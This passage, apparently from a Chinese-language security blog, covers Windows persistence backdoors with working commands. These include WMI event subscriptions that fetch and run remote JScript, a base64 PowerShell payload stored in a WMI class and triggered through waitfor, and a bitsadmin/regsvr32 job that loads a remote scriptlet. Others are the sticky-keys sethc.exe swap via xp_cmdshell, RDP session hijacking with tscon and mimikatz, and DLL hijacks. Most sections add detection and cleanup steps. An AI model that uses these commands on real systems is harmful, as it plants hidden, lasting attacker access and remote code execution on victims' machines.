+<p>原文：<a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf" target="_blank" rel="external">https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf</a></p>
+<p><strong>Drops: 三好学生：</strong></p>
+<ul>
+<li>WMI Attacks: <a href="http://drops.xmd5.com/static/drops/tips-8189.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-8189.html</a></li>
+<li>WMI Backdoor: <a href="http://drops.xmd5.com/static/drops/tips-8260.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-8260.html</a></li>
+<li>WMI Defense: <a href="http://drops.xmd5.com/static/drops/tips-8290.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-8290.html</a></li>
+</ul>
+</blockquote>
+<ul>
+<li>不在Client和Server留下任何文件，实际位于硬盘上的一个复杂的数据库中(objects.data)</li>
+<li>不改动注册表</li>
+<li>仅使用powershell实现</li>
+</ul>
+<p><strong>存储payload</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 管理员权限</span></div><div class="line">powershell&gt; <span class="variable">$StaticClass</span> = <span class="built_in">New-Object</span> Management.ManagementClass(<span class="string">'root\cimv2'</span>, <span class="literal">$null</span>,</div><div class="line"><span class="literal">$null</span>)</div><div class="line">powershell&gt; <span class="variable">$StaticClass</span>.Name = <span class="string">'Win32_EvilClass'</span></div><div class="line">powershell&gt; <span class="variable">$StaticClass</span>.Put()</div><div class="line">powershell&gt; <span class="variable">$StaticClass</span>.Properties.Add(<span class="string">'EvilProperty'</span> , <span class="string">"This is payload"</span>)</div><div class="line">powershell&gt; <span class="variable">$StaticClass</span>.Put()</div></pre></td></tr></table></figure>
+<p><strong>隐蔽定时启动程序</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 管理员权限</span></div><div class="line"><span class="comment"># 功能：每60s执行一次notepad.exe</span></div><div class="line">powershell&gt; <span class="variable">$filterName</span> = <span class="string">'BotFilter82'</span></div><div class="line">powershell&gt; <span class="variable">$consumerName</span> = <span class="string">'BotConsumer23'</span></div><div class="line"><span class="comment"># 创建一个__EventFilter，用于设定触发条件，每隔60s执行一次</span></div><div class="line">powershell&gt; <span class="variable">$exePath</span> = <span class="string">'C:\Windows\System32\notepad.exe'</span></div><div class="line">powershell&gt; <span class="variable">$Query</span> = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE</span></div><div class="line"><span class="string">TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span></div><div class="line">powershell&gt; <span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -Class __EventFilter -NameSpace <span class="string">"root\subscription"</span> -Arguments @&#123;Name= <span class="variable">$filterName</span>;EventNameSpace=<span class="string">"root\cimv2"</span>;QueryLanguage=<span class="string">"WQL"</span>;Query=<span class="variable">$Query</span>&#125; -ErrorAction Stop</div><div class="line"><span class="comment"># 创建一个CommandLineEventConsumer，用于设定执行的操作</span></div><div class="line">powershell&gt; <span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Class CommandLineEventConsumer -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123; Name=<span class="variable">$consumerName</span>;ExecutablePath=<span class="variable">$exePath</span>;CommandLineTemplate=<span class="variable">$exePath</span>&#125;</div><div class="line"><span class="comment"># 用于绑定filter和consumer</span></div><div class="line">powershell&gt; <span class="built_in">Set-WmiInstance</span> -Class __FilterToConsumerBinding -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;<span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span>;Consumer=<span class="variable">$WMIEventConsumer</span>&#125;</div></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<p>通常是通过powershell进行调用，配合schtasks进行定时启动，绕过杀软，也可以执行JavaScript脚本。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!powershell</span></div><div class="line"><span class="variable">$filterName</span> = <span class="string">'filtP1'</span></div><div class="line"><span class="variable">$consumerName</span> = <span class="string">'consP1'</span></div><div class="line"><span class="variable">$Command</span> =<span class="string">"GetObject("</span><span class="string">"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"</span><span class="string">")"</span>    </div><div class="line"><span class="variable">$Query</span> = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span>    </div><div class="line"><span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -Class __EventFilter -NameSpace <span class="string">"root\subscription"</span> -Arguments @&#123;Name=<span class="variable">$filterName</span>;EventNameSpace=<span class="string">"root\cimv2"</span>;QueryLanguage=<span class="string">"WQL"</span>;Query=<span class="variable">$Query</span>&#125; -ErrorAction Stop    </div><div class="line"><span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Class ActiveScriptEventConsumer -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;Name=<span class="variable">$consumerName</span>;ScriptingEngine=<span class="string">'JScript'</span>;ScriptText=<span class="variable">$Command</span>&#125;    </div><div class="line"><span class="built_in">Set-WmiInstance</span> -Class __FilterToConsumerBinding -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;<span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span>;Consumer=<span class="variable">$WMIEventConsumer</span>&#125;</div></pre></td></tr></table></figure>
+<p>通过远程下载js脚本，进行命令调用。<br>优点：无文件落地<br>缺点：目前杀软对powershell这类监管较严格，容易被发现</p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">检测：</div><div class="line"><span class="number">1</span>、查看当前WMI Event（管理员权限）</div><div class="line"><span class="comment">#List Event Filters</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventFilter</div><div class="line"><span class="comment">#List Event Consumers</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventConsumer</div><div class="line"><span class="comment">#List Event Bindings</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __FilterToConsumerBinding</div><div class="line"></div><div class="line"><span class="number">2</span>、查看日志</div><div class="line">Microsoft-Windows-WinRM/Operational</div><div class="line">Microsoft-Windows-WMI-Activity/Operational</div><div class="line">Microsoft-Windows-DistributedCOM</div><div class="line"></div><div class="line"><span class="number">3</span>、Autoruns</div><div class="line">Sysinternals Autoruns只能检测到ActiveScriptEventConsumer和CommandLineEventConsumer的操作，可以理解为上述对进程和注册表监视的操作无法识别</div><div class="line"></div><div class="line">查杀：</div><div class="line"><span class="number">1</span>、清除后门（管理员权限）</div><div class="line"><span class="comment">#Filter</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventFilter -Filter <span class="string">"Name='BotFilter82'"</span> | <span class="built_in">Remove-WmiObject</span> -Verbose</div><div class="line"><span class="comment">#Consumer</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class CommandLineEventConsumer -Filter <span class="string">"Name='BotConsumer23'"</span> | <span class="built_in">Remove-WmiObject</span> -Verbose</div><div class="line"><span class="comment">#Binding</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter <span class="string">"__Path LIKE '%BotFilter82%'"</span> | <span class="built_in">Remove-WmiObject</span> -Verbose</div><div class="line"></div><div class="line"><span class="number">2</span>、甚至禁用Winmgmt服务从根本上阻止该方法的使用</div><div class="line"></div><div class="line">其他方法参考：</div><div class="line">http://drops.xmd5.com/static/drops/tips-<span class="number">8290</span>.html</div></pre></td></tr></table></figure>
+<h4 id="Waitfor-exe"><a href="#Waitfor-exe" class="headerlink" title="Waitfor.exe"></a>Waitfor.exe</h4><p>Waitfor是用来接收或发送来自同一域内主机的信号。位于System32文件夹下，以命令行方式启动。</p>
+<p><strong>思路1：有文件</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、在目标系统保存一个powershell脚本c:\waitfor1.ps1，内容为：</div><div class="line"><span class="built_in">start-process</span> calc.exe</div><div class="line">cmd /c waitfor persist `&amp;`&amp; powershell -executionpolicy bypass -file c:\waitfor1.ps1</div><div class="line"><span class="number">2</span>、等待接受信号</div><div class="line">waitfor persist1 &amp;&amp; powershell -executionpolicy bypass -file c:\waitfor1.ps1</div><div class="line"><span class="number">3</span>、发送信号</div><div class="line">waitfor /s <span class="number">127.0</span>.<span class="number">0.1</span> /si persist1</div><div class="line"></div><div class="line"><span class="comment">#测试时不可持续利用</span></div></pre></td></tr></table></figure>
+<p><strong>思路2：无文件</strong></p>
+<p>将powershell payload命令通过编码保存在WMI类中，进行存储、读取、使用payload（需要管理员权限）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">PowerShell&gt; <span class="variable">$StaticClass</span> = <span class="built_in">New-Object</span> Management.ManagementClass(<span class="string">'root\cimv2'</span>, <span class="literal">$null</span>,<span class="literal">$null</span>)</div><div class="line">PowerShell&gt; <span class="variable">$StaticClass</span>.Name = <span class="string">'Win32_Backdoor'</span></div><div class="line">PowerShell&gt; <span class="variable">$StaticClass</span>.Put()| <span class="built_in">Out-Null</span></div><div class="line">PowerShell&gt; <span class="variable">$StaticClass</span>.Properties.Add(<span class="string">'Code'</span> , <span class="string">"cmd /c start calc.exe ```&amp;```&amp; taskkill /f /im powershell.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA=="</span>)</div><div class="line">PowerShell&gt; <span class="variable">$StaticClass</span>.Put() | <span class="built_in">Out-Null</span></div><div class="line"><span class="comment"># 使用base64编码存储payload</span></div><div class="line">PowerShell&gt; <span class="variable">$exec</span>=([WmiClass] <span class="string">'Win32_Backdoor'</span>).Properties[<span class="string">'Code'</span>].Value;</div><div class="line"><span class="comment"># 读取payload</span></div><div class="line">PowerShell&gt; iex <span class="variable">$exec</span> | <span class="built_in">Out-Null</span></div><div class="line"><span class="comment"># 执行payload</span></div><div class="line"></div><div class="line"><span class="comment"># 也可将上述命令存储为文件，然后执行该文件</span></div><div class="line"><span class="comment"># https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1</span></div><div class="line"><span class="comment"># cmd&gt; powershell -executionpolicy bypass .\Waitfor-Persistence.ps1</span></div><div class="line"></div><div class="line">激活后门：</div><div class="line">cmd&gt; waitfor /s <span class="number">127.0</span>.<span class="number">0.1</span> /si persist</div><div class="line"></div><div class="line"><span class="comment">#测试时可持续利用</span></div></pre></td></tr></table></figure>
+<p>POC：<a href="https://github.com/3gstudent/Waitfor-Persistence" target="_blank" rel="external">https://github.com/3gstudent/Waitfor-Persistence</a></p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、留意后台进程<span class="selector-tag">waitfor</span><span class="selector-class">.exe</span></div><div class="line">2、使用<span class="selector-tag">Process</span> <span class="selector-tag">Explorer</span>查看后台可疑的<span class="selector-tag">cmd</span><span class="selector-class">.exe</span>和<span class="selector-tag">powershell</span><span class="selector-class">.exe</span>进程的启动参数</div></pre></td></tr></table></figure>
+<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>bitsadmin.exe是windows自带的可用于创建下载或上载作业并监视其进度，bistadmin可以指定下载成功之后要进行什么命令。可绕过autorun、常见杀软检测。</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bitsadmin </span>/create <span class="keyword">backdoor</span></div><div class="line"><span class="keyword"># </span>创建任务</div><div class="line"><span class="keyword">bitsadmin </span>/<span class="keyword">addfile </span><span class="keyword">backdoor </span>%comspec% %temp%\cmd.exe</div><div class="line"># 下载本地文件</div><div class="line"><span class="keyword">bitsadmin.exe </span>/SetNotifyCmdLine <span class="keyword">backdoor </span>regsvr32.exe <span class="string">"/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"</span></div><div class="line"># 增加cmd参数，利用regsvr32技巧，解决命令执行弹框问题</div><div class="line"><span class="keyword">bitsadmin </span>/Resume <span class="keyword">backdoor</span></div><div class="line"><span class="keyword"># </span>执行任务</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">列出所有任务</div><div class="line">bitsadmin <span class="string">/list</span> <span class="string">/allusers</span> <span class="string">/verbose</span></div><div class="line">删除某个任务</div><div class="line">bitsadmin <span class="string">/cancel</span> &lt;Job&gt;</div><div class="line">删除所有任务</div><div class="line">bitsadmin <span class="string">/reset</span> <span class="string">/allusers</span></div><div class="line">获取任务创建时间</div><div class="line">bitsadmin <span class="string">/GetCreationTime</span> &lt;Job&gt;</div></pre></td></tr></table></figure>
+<h4 id="msdtc"><a href="#msdtc" class="headerlink" title="msdtc"></a>msdtc</h4><p>MSDTC，是微软分布式传输协调程序，Windows系统默认启动该服务。当计算机加入域中，MSDTC服务启动时，会搜索注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</code></p>
+<p>分别加载3个DLL：<code>oci.dll</code>,<code>SQLLib80.dll</code>,<code>xa80.dll</code></p>
+<p>然而Windows系统默认并不包含<code>oci.dll</code>所以可以将payload.dll重名为oci.dll并保存在%windir%\system32\下</p>
+<p>域中的计算机启动服务MSDTC时就会加载该dll，实现代码执行。</p>
+<p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测。</p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1、检测%windir%\system32\是否包含可疑oci.dll</div><div class="line">2、taskkill /f /im msdtc.exe</div><div class="line">3、Procmon</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> 对于普通用户主机，建议禁用服务MSDTC</span></div></pre></td></tr></table></figure>
+<h4 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h4><p>netsh是windows系统本身提供的功能强大的网络配置命令行工具</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh <span class="keyword">add</span><span class="bash"> helper c:\<span class="built_in">test</span>\netshtest.dll</span></div></pre></td></tr></table></figure>
+<p>helper dll添加成功后，每次调用netsh，均会加载<code>c:\test\netshtest.dll</code></p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">检查：</div><div class="line">检查注册表位置：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\N</span>etSh</div><div class="line">通过Process Explorer查看netsh进程加载的dll</div><div class="line">通过Process Monitor查看进程属性Event Properties</div><div class="line">清除：</div><div class="line">netsh delete helper c:<span class="symbol">\t</span>est<span class="symbol">\n</span>etshtest.dll</div><div class="line">在HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\N</span>etSh删除对应键值</div></pre></td></tr></table></figure>
+<h4 id="DoubleAgent"><a href="#DoubleAgent" class="headerlink" title="DoubleAgent"></a>DoubleAgent</h4><p>该方式主要是对微软系统自带的Application Verifier（应用程序检验器）进行利用</p>
+<p>利用过程如下：</p>
+<ol>
+<li>编写自定义Verifier provider DLL</li>
+<li>通过Application Verifier进行安装</li>
+<li>注入到目标进程执行payload</li>
+<li>每当目标进程启动，均会执行payload，相当于一个自启动的方式</li>
+</ol>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">命令行添加：</div><div class="line">appverif <span class="string">/verify</span> notepad.exe</div><div class="line">命令行删除：</div><div class="line">appverif <span class="string">/n</span> notepad.exe</div></pre></td></tr></table></figure>
+<p>POC : <a href="https://github.com/Cybellum/DoubleAgent" target="_blank" rel="external">https://github.com/Cybellum/DoubleAgent</a></p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">监控注册表键值HKLM:<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File </div><div class="line">查看c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\下</span>有无可疑dll</div></pre></td></tr></table></figure>
+<h4 id="Office"><a href="#Office" class="headerlink" title="Office"></a>Office</h4><p>利用劫持系统的DLL，执行相关命令，同时可绕过Autoruns的后门检测。主要有两种方法：</p>
+<ol>
+<li>劫持office特定功能</li>
+<li>利用Office加载项</li>
+</ol>
+<h5 id="劫持Office软件的特定功能"><a href="#劫持Office软件的特定功能" class="headerlink" title="劫持Office软件的特定功能"></a>劫持Office软件的特定功能</h5><p>通过DLL劫持，在Office软件执行特定功能时触发后门</p>
+<ul>
+<li>劫持Word-审阅-视图【管理员权限】：位于<code>C:\Program Files\Common Files\microsoft shared\RRLoc14\LOCALSVC.DLL</code></li>
+<li>劫持word-插入-图片【TrustedInstaller权限】：位于<code>C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll</code></li>
+<li>劫持word-文件-页面布局-主题-浏览主题【管理员权限】：位于<code>C:\Program Files\Microsoft Office\Office14\2052\GrooveIntlResource.dll</code></li>
+<li>劫持Excel-插入-图片【管理员权限】：位于<code>C:\Program Files\Common Files\microsoft shared\OFFICE14\MSPTLS.DLL</code></li>
+</ul>
+<h5 id="利用Office加载项"><a href="#利用Office加载项" class="headerlink" title="利用Office加载项"></a>利用Office加载项</h5><ul>
+<li>Word WLL</li>
+<li>Excel XLL</li>
+<li>Excel VBA add-ins</li>
+<li>PowerPoint VBA add-ins</li>
+</ul>
+<p><strong>以word为例：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 编译成calc.dll，重命名为calc.wll，保存在路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Word\Startup（Startup路径可保存多个wll，支持启动多个wll），启动Word.exe，弹出计算器，并且word正常启动</span></div><div class="line"></div><div class="line">powershell下wll路径</div><div class="line"><span class="variable">$env:APPDATA</span>+<span class="string">"\Microsoft\Word\Startup\calc.wll"</span></div><div class="line"></div><div class="line">将编译好的calc.dll作base64加密并存储于变量中</div><div class="line">PowerShell&gt; <span class="variable">$fileContent</span> = [System.IO.File]::ReadAllBytes(<span class="string">'calc.dll'</span>)</div><div class="line">PowerShell&gt; <span class="variable">$fileContentEncoded</span> = [System.Convert]::ToBase64String(<span class="variable">$fileContent</span>)| <span class="built_in">set-content</span> (<span class="string">"calcdllbase64.txt"</span>) </div><div class="line"></div><div class="line">用变量<span class="variable">$fileContent</span>存储base64加密的calc.dll</div><div class="line">PowerShell&gt; <span class="variable">$fileContent</span> = <span class="string">"<span class="variable">$fileContentEncoded_payload</span>"</span></div><div class="line"></div><div class="line">base64解密并释放calc.wll至Startup路径的代码如下：</div><div class="line">PowerShell&gt; <span class="variable">$fileContentBytes</span> = [System.Convert]::FromBase64String(<span class="variable">$fileContent</span>) </div><div class="line">[System.IO.File]::WriteAllBytes(<span class="variable">$env:APPDATA</span>+<span class="string">"\Microsoft\Word\Startup\calc.wll"</span>,<span class="variable">$fileContentBytes</span>)</div><div class="line"></div><div class="line"><span class="comment"># 具体参考：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</span></div></pre></td></tr></table></figure>
+<p>其他POC：<a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="external">https://github.com/3gstudent/Office-Persistence</a></p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">禁用所有加载项</div><div class="line">禁用所有控件</div><div class="line">禁用所有宏</div><div class="line">删除信任位置：</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\a</span><span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>ord<span class="symbol">\S</span>tartup\</div></pre></td></tr></table></figure>
+<h3 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h3><p>通过远程桌面连接到Windows后，在没有输入用户名和密码前，连接按5次<code>Shift</code>键，可以调用<code>c:\windows\system32\sethc.exe</code>，所以需要把<code>c:\windows\system32\sethc.exe</code>替换成其他的执行程序即可执行该程序。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y</div><div class="line">copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe /y</div><div class="line">attrib c:\windows\system32\sethc.exe +h</div><div class="line">attrib c:\windows\system32\dllcache\sethc.exe +h</div><div class="line"><span class="meta">#</span><span class="bash"> attrib +h是添加隐藏属性</span></div></pre></td></tr></table></figure>
+<p>在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators。</p>
+<p>也可以使用命令，比如：使用MSSQL的<code>xp_cmdshell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">exec xp_cmdshell &apos;takeown /f c:\windows\system32\sethc.* /a /r /d y&apos;</div><div class="line"># 将所有者更改为管理员组(administrators)</div><div class="line">exec xp_cmdshell &apos;cacls c:\windows\system32\sethc.exe /T /E /G system:F&apos;</div><div class="line"># 赋予system完全控制权限</div><div class="line">exec xp_cmdshell &apos;copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y&apos;</div><div class="line"># 替换文件为cmd.exe</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、检测c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\s</span>ethc.exe文件大小、时间</div><div class="line">2、连按5次shift键</div></pre></td></tr></table></figure>
+<h3 id="RDP会话劫持"><a href="#RDP会话劫持" class="headerlink" title="RDP会话劫持"></a>RDP会话劫持</h3><p>RDP劫持简单的说就是在不知道另一账户密码的情况下直接切换到该用户会话下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1、query    user        查看服务器用户会话信息</div><div class="line">2、sc create sesshijack 创建一个sesshijack服务</div><div class="line">3、net start sesshijack 开启服务</div><div class="line"></div><div class="line">query user</div><div class="line">sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#4"</div><div class="line"><span class="meta">#</span><span class="bash"> rdp-tcp<span class="comment">#4为正在活动中的其他会话</span></span></div><div class="line">net start sesshijack</div></pre></td></tr></table></figure>
+<p>无凭据时的会话劫持技巧是Benjamin Delpy（Mimikatz作者）在2011年提到的，所以Mimikatz模块也集成了此项功能</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mimikatz.exe</div><div class="line">mimikatz # ts::sessions</div><div class="line">mimikatz # ts::remote /id:4 (4表示会话ID)</div><div class="line">mimikatz # privilege::debug</div><div class="line">mimikatz # ts::remote /id:4</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1、使用可以记录这种攻击的工具，比如：Microsoft OMS, Windows Event Forwarding</div><div class="line">2、查找Mimikatz的相关依赖</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> 使用组策略来注销已断开的会话或者空闲的用户会话</span></div></pre></td></tr></table></figure>
+<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>.NET后渗透下的权限维持：<a href="https://github.com/Ivan1ee/NetDLLSpy" target="_blank" rel="external">https://github.com/Ivan1ee/NetDLLSpy</a></p>
+<p>密码记录：WinlogonHack、Gina</p>
+<p>利用服务：sc create [ServerName] binPath= BinaryPathName</p>
+<p>快捷方式后门： <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1" target="_blank" rel="external">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
+<p>。。。</p>
+<p>感谢大佬们分享的文章，还有很多要学习的。</p>
+<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><p><a href="https://www.bodkin.ren/index.php/archives/431/" target="_blank" rel="external">https://www.bodkin.ren/index.php/archives/431/</a></p>
+<p><a href="https://www.anquanke.com/post/id/171891" target="_blank" rel="external">https://www.anquanke.com/post/id/171891</a></p>
+<p><a href="http://vinc.top/2015/09/15/metasploit-web-delivery/" target="_blank" rel="external">http://vinc.top/2015/09/15/metasploit-web-delivery/</a></p>
+<p><a href="https://kionf.com/2018/09/13/metasploit-presistence/" target="_blank" rel="external">https://kionf.com/2018/09/13/metasploit-presistence/</a></p>
+<p><a href="https://www.jianshu.com/p/0cfcbba813ac" target="_blank" rel="external">https://www.jianshu.com/p/0cfcbba813ac</a></p>
+<p><a href="https://blog.csdn.net/gaojinshan/article/details/8480185" target="_blank" rel="external">https://blog.csdn.net/gaojinshan/article/details/8480185</a></p>
